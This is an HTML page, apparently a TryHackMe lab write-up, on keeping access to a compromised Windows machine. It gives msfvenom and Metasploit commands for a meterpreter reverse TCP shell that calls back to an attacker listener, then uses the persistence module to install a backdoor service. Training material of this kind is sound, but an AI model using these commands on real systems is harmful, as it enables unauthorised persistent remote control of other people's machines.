<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>Maintaining Access</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>Maintaining Access</h1><br/>There are a quite a few ways to maintain  access on a machine or network we will be covering a fairly simple way  of maintaining access by first setting up a meterpreter shell and then  using the persistence metasploit module allowing us to create a backdoor  service in the system that will give us an instant meterpreter shell if  the machine is ever shutdown or reset.<br />There  are also other ways of maintaining access such as advanced backdoors  and rootkits however those are out of scope for this room.<br />This  will require a little more manual setup than the other tasks so it is  recommended to have previous knowledge of msfvenom and metasploit.<br /><h2>Generating a Payload w/ msfvenom</h2><h3>﻿</h3><br /><h3>1.) </h3><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe</code> this will generate a basic windows meterpreter reverse tcp shell<br /><a href="https://i.imgur.com/QMUjy24.png"><img src="images/79-1.png" alt="images/79-1.png" /></a><br />2.) Transfer the payload from your attacker machine to the target machine.<br />3.) <code>use exploit/multi/handler</code> - this will create a listener on the port that you set it on.<br />4.) Configure our payload to be a windows meterpreter shell: <code>set payload windows/meterpreter/reverse_tcp</code><br />5.) After setting your THM IP address as your &quot;LHOST&quot;, start the listener with <code>run</code><br />6.)  Executing the binary on the windows machine will give you a meterpreter shell back on your host - let&#39;s return to that<br />7.) Verify that we&#39;ve got a meterpreter shell, where we will then <code>background </code>it to run the persistence module.<br /><h2>Run the Persistence Module -</h2><br />1.) <code>use exploit/windows/local/persistence</code> this module will send a payload every 10 seconds in default however you can set this time to anything you want<br />2.) <code>set session 1</code> set the session to the session that we backgrounded in meterpreter (you can use the <code>sessions</code> command in metasploit to list the active sessions)<br /><a href="https://i.imgur.com/KxaNZo5.png"><img src="images/79-2.png" alt="images/79-2.png" /></a><br />If  the system is shut down or reset for whatever reason you will lose your  meterpreter session however by using the persistence module you create a  backdoor into the system which you can access at any time using the  metasploit multi handler and setting the payload to <code>windows/meterpreter/reverse_tcp</code> allowing you to send another meterpreter payload to the machine and open up a new meterpreter session.<br /><a href="https://i.imgur.com/Q6pToA1.png"><img src="images/79-3.png" alt="images/79-3.png" /></a><br />Here  you can see the session die however the second we run the handler again  we get a meterpreter shell back thanks to the persistence service.<br />There  are other ways of maintaining access such as adding users and rootkits  however I will leave you to do your own research and labs on those topics.<br /></div></body></html>